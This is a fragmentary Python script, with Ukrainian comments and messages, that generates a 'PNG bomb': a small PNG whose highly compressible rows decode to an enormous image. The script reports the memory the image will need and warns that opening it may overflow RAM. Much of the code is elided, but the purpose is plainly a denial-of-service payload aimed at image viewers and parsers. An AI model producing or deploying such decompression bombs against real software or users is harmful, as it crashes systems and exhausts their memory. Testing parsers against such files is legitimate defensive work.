...
def create_png_bomb(width, height, filename, mode='gray'):
    ...
    comp = zlib.compressobj(2, zlib.DEFLATED, 15)
    line_len = 1 + width * bpp

    first_line = b'\x00' + bytes([0x80] * (width * bpp))
    up_line = b'\x02' + b'\x00' * (width * bpp)  # bytes() вже нулі

    # Пишем стиснуті дані напряму в буфер
    compressed_parts = []
    ...
    compressed = b''.join(compressed_parts)  # тепер тільки стиснуті дані — малий об'єм
...
def main():
    ...
    if W < 1 or H < 1:
        print("Помилка: вимірів має бути >= 1"); sys.exit(1)
    if W > 2**31 - 1 or H > 2**31 - 1:
        print("Error: PNG max dimension is 2^31-1"); sys.exit(1)
    bpp = {'gray': 1, 'rgb': 3, 'rgba': 4}[args.mode]
    decoded = W * H * bpp
    display = W * H * 4
    print(f"Генератор PNG ,jv,b")
    print(f"{'=' * 40}")
    print(f"Зображення:     {W:,} x {H:,} px ({args.mode.upper()})")
    print(f"Декодоване:   {human(decoded)}")
    print(f"Відображення:   {human(display)} (RGBA)")
    start = time.perf_counter()
    file_size = create_png_bomb(W, H, args.output, args.mode)
    end = time.perf_counter()
    print(f"Витрачений час: {end - start:0.4f} секунд")
    print(f"Відкриття цього файлу {human(display)} може спричинити переповнення RAM!")
